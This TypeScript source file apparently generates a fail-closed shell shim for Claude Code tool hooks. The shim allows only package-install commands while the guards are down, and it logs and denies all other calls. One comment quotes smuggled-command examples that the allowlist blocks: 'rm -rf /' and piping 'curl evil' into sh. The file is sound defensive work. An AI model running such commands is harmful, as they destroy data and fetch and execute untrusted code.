import * as fs from 'fs';
import * as path from 'path';

// ---------------------------------------------------------------------------
// The single checked-in shim (.claude/webpieces/ai-hook.sh). Both project hooks point at it, passing
// their bin name as the first arg. settings.json points here (not at the bare bin) so a missing bin
// (fresh clone, package removed) yields a friendly message instead of the raw `sh: No such file or
// directory` on every Write/Edit/Bash tool call. `.claude` is committed, so the shim survives even
// when node_modules does not.
//
// This module is the SINGLE SOURCE OF TRUTH for the shim body + the installer allowlist. The
// installer (setup.ts) renders it on install; the running guards binary re-renders and self-heals it
// (healShim) so the committed .sh can never go stale — no human ever hand-edits it.
// ---------------------------------------------------------------------------
export const SHIM_MARKER = '.claude/webpieces/ai-hook.sh';

export function shimPath(projectRoot: string): string {
    return path.join(projectRoot, '.claude', 'webpieces', 'ai-hook.sh');
}

// Package-manager install commands allowed to pass the fail-closed shim so the assistant can
// self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
// the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
//
// What's allowed (the realistic self-heal spellings — an earlier version only matched a bare
// `pnpm install`, so `pnpm i` and `--flag=value` got fail-CLOSED and re-deadlocked the assistant):
//   - pkg managers: pnpm | npm   (this nx monorepo uses pnpm; npm is accepted as the fallback. NOT
//                                 yarn — this repo installs with pnpm/npm only, so yarn stays denied.)
//   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
//   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
//
// No `cd` prefix on purpose: the root package.json IS the install target in this nx monorepo and
// Claude Code starts at the repo root, so a bare `pnpm install` always works — no `cd` is ever needed,
// and allowing one would only widen the attack surface of a fail-CLOSED escape hatch.
//
// Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
// accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
// along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
// Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
export const INSTALLER_ALLOW_ERE =
    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';

// JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
// uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
// commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
// same deadlock, other side. A unit test asserts the two agree on a sample set.
export const INSTALLER_ALLOW_JS =
    /^(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*\s*$/;

// Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
// \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
// grep pattern is interpolated from INSTALLER_ALLOW_ERE (its value has no backslashes).
// Shell fragment: the version-drift guard (see its own block comment). Extracted to a module const so
// renderShim() stays within the method-line budget; it is spliced back in verbatim, byte-for-byte.
const VERSION_DRIFT_GUARD_SH = `# --- webpieces version-drift guard (pure sh — runs even when the installed guard bin is stale) -----
# The committed shim is version-agnostic, so it keeps working right after a git pull, BEFORE the
# matching pnpm install. That is exactly when node_modules can be STALE: an OLDER @webpieces than
# package.json now pins, whose outdated validator rejects the NEWER webpieces.config.json with baffling
# "unknown rule" errors. Detect that drift HERE (before exec'ing the possibly-stale bin): compare every
# EXACT-pinned @webpieces/* version in the root package.json against the version actually installed in
# node_modules; the first mismatch wins. Range specs (^ ~ workspace:*) are skipped, so they never
# false-positive; best-effort — a version we cannot read is skipped. On drift we fall through to the
# SAME fail-closed path as a missing bin (allow only pnpm install, deny the rest).
DRIFT_PKG=""
DRIFT_DECLARED=""
DRIFT_INSTALLED=""
if [ -f "$ROOT/package.json" ]; then
  while IFS=' ' read -r WP_NAME WP_DECL; do
    [ -n "$WP_NAME" ] || continue
    WP_MANIFEST="$ROOT/node_modules/@webpieces/$WP_NAME/package.json"
    [ -f "$WP_MANIFEST" ] || continue
    WP_INST="$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p' "$WP_MANIFEST" | head -n1)"
    [ -n "$WP_INST" ] || continue
    if [ "$WP_DECL" != "$WP_INST" ]; then
      DRIFT_PKG="@webpieces/$WP_NAME"
      DRIFT_DECLARED="$WP_DECL"
      DRIFT_INSTALLED="$WP_INST"
      break
    fi
  done <<WPEOF
$(sed -n 's/.*"@webpieces\\/\\([A-Za-z0-9._-]*\\)"[[:space:]]*:[[:space:]]*"\\([0-9][0-9A-Za-z.-]*\\)".*/\\1 \\2/p' "$ROOT/package.json")
WPEOF
fi`;

// Shell fragment: pick the fail-closed deny REASON — a version-drift message (bin present but stale)
// vs the missing-bin message. Extracted alongside VERSION_DRIFT_GUARD_SH to keep renderShim() small.
const DENY_REASON_SH = `if [ -n "\$DRIFT_PKG" ]; then
  REASON="❌ webpieces is out of date: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. This hook rejects every call except 'pnpm install' because your installed webpieces is older than webpieces.config.json requires. Please run 'pnpm install' now, then retry."
else
  REASON="❌ @webpieces/ai-hook-rules is declared in package.json but is not installed (\${BIN_NAME} not found). Run 'pnpm install' (or this repo's installer) to enable the webpieces AI guards, then retry. (If you removed @webpieces/ai-hook-rules on purpose, delete its hooks from .claude/settings.json.)"
fi`;

export function renderShim(): string {
    return `#!/bin/sh
# Managed by @webpieces/ai-hook-rules (wp-setup-ai-hooks) — do not edit; the installer AND the running
# guards binary both overwrite this file (self-healing) from renderShim(). Checked in on purpose so the
# hook has a stable, committed entry point even when node_modules is absent. Safe to delete along with
# the matching .claude/settings.json entries if you remove @webpieces/ai-hook-rules.
#
# Usage (wired into .claude/settings.json): sh "$CLAUDE_PROJECT_DIR/.claude/webpieces/ai-hook.sh" <bin-name>
BIN_NAME="$1"
shift
# Resolve the bin relative to THIS script (…/<root>/.claude/webpieces/ai-hook.sh → <root>), not the
# caller's cwd — the hook can be invoked from any directory (a subdir, or a nested clone).
ROOT="$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)"
BIN="$ROOT/node_modules/.bin/$BIN_NAME"
${VERSION_DRIFT_GUARD_SH}
if [ -x "$BIN" ] && [ -z "$DRIFT_PKG" ]; then
  exec "$BIN" "$@"          # exec preserves stdin — hooks receive the tool payload as JSON on stdin
fi
# Bin missing (fresh clone before install, or a broken install) OR a version drift (stale node_modules).
# The webpieces guards CANNOT safely run.
# Before failing closed, peek at the tool payload and let ONLY package-manager install commands
# through: the assistant's own Bash tool routes through this hook too, so blocking everything would
# deadlock the one command (pnpm/npm install) that re-enables the guards. A silent exit 0 = "allow"
# in the PreToolUse protocol; the guards resume automatically once node_modules is present.
PAYLOAD="$(cat)"
CMD="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
TOOL="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
# Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
# human can inspect after something odd (an install that was denied, or one that slipped through). One
# tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
# blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
# the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
LOG_DIR="$ROOT/.webpieces/logs"
wp_log() {                   # $1 = decision label (ALLOW-INSTALL | DENY)
  { mkdir -p "$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "$BIN_NAME" "$TOOL" "$1" "$CMD" >> "$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
}
DENY_LABEL="DENY"
[ -n "$DRIFT_PKG" ] && DENY_LABEL="DENY-STALE"   # version drift, not a missing bin
if printf '%s' "$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}'; then
  wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
  exit 0                     # allow the installer so the assistant can self-heal the deadlock
fi
wp_log "$DENY_LABEL"         # record every fail-closed block (…-STALE = version drift) for inspection
# Not an installer command → FAIL CLOSED. Deny via Claude Code's PreToolUse JSON protocol
# (permissionDecision "deny" on stdout, then exit 0) rather than a bare "exit 2". BOTH block the call,
# but the reason must be made visible, and HOW depends on the tool (verified by live tests; the docs
# are wrong here):
#   - Bash deny:  permissionDecisionReason is NOT shown to the human — ONLY a top-level systemMessage
#                 is, and it honors ANSI. So for Bash we emit systemMessage wrapped in ANSI red so the
#                 "run pnpm install" fix is visible (today, on Bash, it is invisible).
#   - Write/Edit/MultiEdit deny: permissionDecisionReason renders as a RED "Error:" block natively —
#                 no systemMessage needed (a second line would be redundant).
#   - NEVER exit 2 (stdout JSON ignored; stderr not reliably shown on a blocked Bash call).
# The ESC is emitted as the literal 6-char JSON escape \\u001b (built via \${BS} so no raw ESC byte and
# no \\uXXXX sits in this source); Claude Code's JSON parser turns \\u001b into ESC. The reason is a
# single JSON string with no double-quotes/backslashes, so it stays valid JSON after \${BIN_NAME} subs.
${DENY_REASON_SH}
if [ "\$TOOL" = "Bash" ]; then
  BS='\\'                     # one literal backslash, so the \\u001b escape never sits in this source
  ESC="\${BS}u001b"          # the 6 chars: backslash u 0 0 1 b — Claude Code parses \\u001b → ESC
  printf '{"systemMessage":"%s🛑 %s%s","hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\${ESC}[31;1m" "\$REASON" "\${ESC}[0m" "\$REASON"
else
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\$REASON"
fi
exit 0                       # decision is carried by permissionDecision "deny", not the exit code
`;
}

// Find the repo root that owns the committed shim to heal: walk up from `cwd` (the invocation's
// actual dir) to the nearest ancestor holding a shim, falling back to $CLAUDE_PROJECT_DIR (which
// Claude Code exports to hooks) only if the walk finds nothing. cwd-first keeps this correct for a
// nested clone and testable (a temp root is honoured over the ambient project env). Returns null when
// no committed shim exists (e.g. a global / absolute install, which has none to heal).
function findShimRoot(cwd: string): string | null {
    let dir = cwd;
    for (;;) {
        if (fs.existsSync(shimPath(dir))) return dir;
        const parent = path.dirname(dir);
        if (parent === dir) break;
        dir = parent;
    }
    const env = process.env['CLAUDE_PROJECT_DIR'];
    if (env && fs.existsSync(shimPath(env))) return env;
    return null;
}

// Best-effort: keep the committed shim identical to renderShim() so the fail-closed escape hatch and
// allowlist never drift. Only rewrites an EXISTING shim (never creates one) so global installs are
// untouched. NEVER throws — a self-heal must never block or crash a tool call.
export function healShim(cwd: string): void {
    // eslint-disable-next-line @webpieces/no-unmanaged-exceptions
    try {
        const root = findShimRoot(cwd);
        if (!root) return;
        const target = shimPath(root);
        const desired = renderShim();
        if (fs.readFileSync(target, 'utf8') === desired) return;
        fs.writeFileSync(target, desired, { mode: 0o755 });
        fs.chmodSync(target, 0o755);
    } catch (err: unknown) {
        //const error = toError(err);
        // Ignore: healing is a convenience, not part of the guard decision.
    }
}
